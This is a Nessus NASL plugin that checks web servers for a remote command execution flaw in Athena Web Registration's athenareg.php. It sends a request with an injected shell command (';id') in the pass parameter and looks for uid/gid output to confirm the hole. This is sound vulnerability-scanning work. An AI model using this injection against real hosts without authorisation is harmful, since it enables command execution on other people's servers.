#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: Peter Kieser
# This script is released under the GNU GPL v2
#

if(description)
{
 script_id(18376);
 script_bugtraq_id(9349);
 script_cve_id("CAN-2004-1782");
 if ( defined_func("script_xref") ) script_xref(name:"OSVDB", value:"16861");
  
 script_version("$Revision: 1.1 $");
 name["english"] = "Athena Web Registration remote command execution flaw";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running Athena Web server.

The remote version of this software is vulnerable to remote command 
execution flaw threw the athenareg.php script.

A malicious user could execute arbitrary commands on the remote host.

Solution: No update currently available, use another web server
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for Athena Web Registration remote command execution flaw";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# easy target

include("http_func.inc");
include("http_keepalive.inc");

function check(req)
{
  req = string(req, "/athenareg.php?pass=%20;id");
  req = http_get(item:req, port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if( buf == NULL)exit(0);

  if ( egrep(pattern:"uid=[0-9].*gid=[0-9]", string:buf) )
  {
   	security_hole(port);
	exit(0);
  }
 return(0);
}

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

foreach dir (cgi_dirs())
{
  check(req:dir);
}
